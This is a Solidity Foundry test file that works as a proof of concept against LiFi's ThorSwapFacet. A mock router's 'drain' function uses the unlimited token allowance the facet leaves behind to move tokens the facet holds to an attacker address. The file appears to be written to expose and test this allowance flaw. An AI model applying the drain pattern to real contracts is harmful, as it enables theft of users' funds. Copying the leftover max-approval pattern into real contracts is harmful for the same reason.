// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
import {ThorSwapFacet} from "lifi/Facets/ThorSwapFacet.sol";
import {IThorSwap} from "lifi/Interfaces/IThorSwap.sol";
import {ILiFi} from "lifi/Interfaces/ILiFi.sol";

contract MockThorRouter is IThorSwap {
    address public token;

    constructor(address _token) {
        token = _token;
    }

    function depositWithExpiry(address, address, uint256 amount, string calldata, uint256) external payable override {
        MockERC20(token).transferFrom(msg.sender, address(this), amount);
    }

    // malicious function to drain tokens using leftover allowance
    function drain(address from, address to, uint256 amount) external {
        MockERC20(token).transferFrom(from, to, amount);
    }
}

contract ThorSwapFacetAllowanceTest is Test {
    MockERC20 internal token;
    MockThorRouter internal router;
    ThorSwapFacet internal facet;
    address internal attacker = address(0xbeef);

    function setUp() public {
        token = new MockERC20("Mock", "MOCK", 18);
        router = new MockThorRouter(address(token));
        facet = new ThorSwapFacet(address(router));

        token.mint(address(this), 100 ether);
        token.approve(address(facet), type(uint256).max);
    }

    function test_UnlimitedAllowanceAllowsTokenDrain() public {
        ILiFi.BridgeData memory bridgeData = ILiFi.BridgeData({
            transactionId: bytes32("tx"),
            bridge: "",
            integrator: "",
            referrer: address(0),
            sendingAssetId: address(token),
            receiver: address(0x1234),
            minAmount: 10 ether,
            destinationChainId: 2,
            hasSourceSwaps: false,
            hasDestinationCall: false
        });

        ThorSwapFacet.ThorSwapData memory thorData =
            ThorSwapFacet.ThorSwapData({vault: address(0xdead), memo: "", expiration: block.timestamp + 1});

        facet.startBridgeTokensViaThorSwap(bridgeData, thorData);

        // allowance remains set to max
        assertEq(token.allowance(address(facet), address(router)), type(uint256).max);

        // attacker sends tokens to facet and router drains them
        token.mint(address(facet), 5 ether);
        router.drain(address(facet), attacker, 5 ether);

        assertEq(token.balanceOf(attacker), 5 ether);
    }
}
